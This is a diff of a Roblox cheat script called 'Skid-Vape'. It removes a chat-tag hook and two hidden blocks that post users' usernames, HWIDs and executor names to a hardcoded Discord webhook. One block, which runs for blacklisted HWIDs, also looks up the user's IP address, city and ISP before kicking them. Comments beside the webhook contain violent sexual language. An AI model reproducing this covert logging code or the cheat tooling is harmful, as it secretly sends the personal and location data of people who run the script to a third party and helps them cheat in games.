@@ -6100,7 +6100,7 @@ run(function()
 			local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
 			
 			NewSkidWatermark.Name = "NewSkidWatermark"
-			NewSkidWatermark.Parent = game.CoreGui
+			NewSkidWatermark.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 			NewSkidWatermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 			
 			Frame.Parent = NewSkidWatermark
@@ -6164,7 +6164,7 @@ run(function()
 			UIAspectRatioConstraint.AspectRatio = 2.839
                 end)
             else
-                local WatermarkGUI = game:WaitForChild("CoreGui"):FindFirstChild("NewSkidWatermark")
+                local WatermarkGUI = game:WaitForChild("PlayerGui"):FindFirstChild("NewSkidWatermark")
                 if WatermarkGUI then
                     WatermarkGUI:Destroy()
                 end
@@ -6382,67 +6382,7 @@ run(function()
         Default = 1.5
     })
 end)
-run(function()
-	task.spawn(function()
-		local Players = game:GetService("Players")
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local yes = Players.LocalPlayer.Name
-		local stav = "7F19CCFB-49F8-4938-A2FA-10B712E6B36B"
-		local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-		local ChatTag = {}
-		ChatTag[yes] = {
-			TagText = "SKID-WARE USER",
-			TagColor = Color3.new(255, 255, 255),
-		}
-		
-		local oldchanneltab
-		local oldchannelfunc
-		local oldchanneltabs = {}
-		
-		--// Chat Listener
-		for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
-			if
-				v.Function
-				and #debug.getupvalues(v.Function) > 0
-				and type(debug.getupvalues(v.Function)[1]) == "table"
-				and getmetatable(debug.getupvalues(v.Function)[1])
-				and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
-			then
-				oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
-				oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
-				getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
-					local tab = oldchannelfunc(Self, Name)
-					if tab and tab.AddMessageToChannel then
-						local addmessage = tab.AddMessageToChannel
-						if oldchanneltabs[tab] == nil then
-							oldchanneltabs[tab] = tab.AddMessageToChannel
-						end
-						tab.AddMessageToChannel = function(Self2, MessageData)
-							if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then
-								if ChatTag[Players[MessageData.FromSpeaker].Name] then
-									MessageData.ExtraData = {
-										NameColor = Players[MessageData.FromSpeaker].Team == nil and Color3.new(15, 15, 15)
-											or Players[MessageData.FromSpeaker].TeamColor.Color,
-										Tags = {
-											table.unpack(MessageData.ExtraData.Tags),
-											{
-												TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,
-												TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,
-											},
-										},
-									}
-								end
-							end
-							return addmessage(Self2, MessageData)
-						end
-					end
-					return tab
-				end
-			end
-		end
-	end)
-end)
-
+					
 run(function()
 	local FPS = {}
 	local FPSLabel
@@ -6589,185 +6529,4 @@ run(function()
 	createKeystroke(Enum.KeyCode.A, UDim2.new(0, 0, 0, 42), UDim2.new(0, 7, 0, 5))
 	createKeystroke(Enum.KeyCode.D, UDim2.new(0, 76, 0, 42), UDim2.new(0, 8, 0, 5))
 	createKeystroke(Enum.KeyCode.Space, UDim2.new(0, 0, 0, 83), UDim2.new(0, 25, 0, -10))
-end)
-
-run(function()
-    task.spawn(function()
-        local Blacklist = {
-            "B9A7F9DB-E2B9-469F-8D96-6D983AB59C14", -- relic (chang3d)
-            "66007b9b-95a4-4a37-8d90-5c589e02dc7b" -- nebula (omegalol)
-		}
-
-        for i, id in pairs(Blacklist) do
-            if id == HWID then
-				local player_name = game:GetService("Players").LocalPlayer.Name
-				local id = tostring(game:GetService("Players").LocalPlayer.UserId)
-				local ip_info = request({
-					Url = "http://ip-api.com/json",
-					Method = "GET"
-				})
-				local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-				local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
-				local executoridentify = identifyexecutor()
-				local gameId = tostring(game.GameId)
-				local placeId = tostring(game.PlaceId)
-				local gamedetect = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-				local embedMessage = {
-					["embeds"] = {{
-						["title"] = "Execution logged",
-						["color"] = 0xff0000,
-						["fields"] = {
-							{
-								["name"] = "**User Information:**",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "User: "..player_name.." ("..id..")",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "Executor: "..executoridentify.."",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "HWID: "..clientid.."",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "IP: "..ipinfo_table.query.."",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "Country: "..ipinfo_table.country.." ("..ipinfo_table.countryCode..")",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "Region: "..ipinfo_table.regionName.." ("..ipinfo_table.region..")",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "City: "..ipinfo_table.city.." ("..ipinfo_table.zip..")",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "ISP: "..ipinfo_table.isp.." ("..ipinfo_table.org..")",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "**Game Information:**",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "Game: "..gamedetect.." ("..gameId..")",
-								["value"] = "",
-								["inline"] = false
-							},
-							{
-								["name"] = "PlaceID: "..placeId.."",
-								["value"] = "",
-								["inline"] = false
-							}
-						},
-						["footer"] = {
-							["text"] = "Made with love by Stav 💖 | Blacklisted person ⚠️",
-							["icon_url"] = ""
-						}
-					}}
-				}
-				local response = request({
-					Url = 'https://discord.com/api/webhooks/1269451644727201824/zPhN9a_Z1DBHkBmxyl0V6stcto5iAb7UDzjX7InfZkaU04PjDxRunRRZoAam_eV8jFDS', -- system i will gangrape you ;)
-					Method = "POST",
-					Headers = {
-						["Content-Type"] = "application/json"
-					},
-					Body = game:GetService("HttpService"):JSONEncode(embedMessage)
-				})
-                game.Players.LocalPlayer:Kick("Mald, you got logged, ggs.")
-                break
-            end
-        end
-    end)
-end)
-
-run(function()
-	task.spawn(function()
-		local player_name = game:GetService("Players").LocalPlayer.Name
-		local id = game:GetService("Players").LocalPlayer.UserId
-		local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
-		local executoridentify = identifyexecutor()
-		local gameId = game.GameId
-		local placeId = game.PlaceId
-		local gamedetect = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-		local embedMessage = {
-			["embeds"] = {{
-				["title"] = "Execution logged",
-				["color"] = 0xff0000,
-				["fields"] = {
-					{
-						["name"] = "**User Information:**",
-						["value"] = "",
-						["inline"] = false
-					},
-					{
-						["name"] = "User: "..player_name.." ("..id..")",
-						["value"] = "",
-						["inline"] = false
-					},
-					{
-						["name"] = "Executor: "..executoridentify.."",
-						["value"] = "",
-						["inline"] = false
-					},
-					{
-						["name"] = "**Game Information:**",
-						["value"] = "",
-						["inline"] = false,
-					},
-					{
-						["name"] = "Game: "..gamedetect.." ("..gameId..")",
-						["value"] = "",
-						["inline"] = false
-					},
-					{
-						["name"] = "PlaceID: "..placeId.."",
-						["value"] = "",
-						["inline"] = false
-					},
-					{
-						["name"] = "***Whitelist Information:***",
-						["value"] = "",
-						["inline"] = false,
-					},
-					{
-						["name"] = "**Executed Skid-Vape: ✅**",
-						["value"] = "",
-						["inline"] = false
-					}
-				},
-				["footer"] = {
-					["text"] = "Made with love by Stav 💖 (Skid-Vape best config!)",
-					["icon_url"] = "https://media.discordapp.net/attachments/1263811329353977886/1264357231080767690/image5.png?ex=669d93ee&is=669c426e&hm=831197fe2044d0bd71d78a45c811458edb3490d449be6f39c875ae8182f62526&=&format=webp&quality=lossless"
-				}
-			}}
-		}
-
-		local response = request({
-			Url = 'https://discord.com/api/webhooks/1269451644727201824/zPhN9a_Z1DBHkBmxyl0V6stcto5iAb7UDzjX7InfZkaU04PjDxRunRRZoAam_eV8jFDS', -- hi system ;) time to gangrape you!
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json"
-			},
-			Body = game:GetService("HttpService"):JSONEncode(embedMessage)
-		})
-	end)
 end)
